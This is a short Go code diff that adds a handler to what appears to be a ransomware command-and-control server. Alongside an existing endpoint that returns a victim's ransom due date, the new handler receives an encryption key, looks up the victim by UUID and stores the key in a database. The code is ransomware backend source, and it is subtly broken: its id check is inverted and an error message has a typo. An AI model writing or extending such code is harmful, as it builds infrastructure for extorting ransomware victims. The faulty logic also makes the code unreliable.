@@ -182,3 +182,30 @@ func GetRansomwareDueDate(w http.ResponseWriter, r *http.Request) {
 	tm := time.Unix(victim.DueDate, 0)
 	w.Write([]byte(tm.String()))
 }
+
+func ReceiveEncryptionKey(w http.ResponseWriter, r *http.Request) {
+	uuid := r.URL.Query().Get("id")
+	if uuid != "" {
+		http.Error(w, "no iq query provided", http.StatusBadRequest)
+		return
+	}
+
+	key, err := ioutil.ReadAll(r.Body)
+	if err != nil {
+		http.Error(w, "error reading request body", http.StatusInternalServerError)
+		return
+	}
+
+	db := database.GetDatabase()
+	var victim database.Victim
+	if err := db.Where(&database.Victim{UUID: uuid}).First(&victim).Error; err != nil {
+		http.Error(w, "error finding victim information", http.StatusNotFound)
+		return
+	}
+
+	victim.EncryptionKey = key
+
+	db.Save(&victim)
+
+	w.WriteHeader(http.StatusOK)
+}
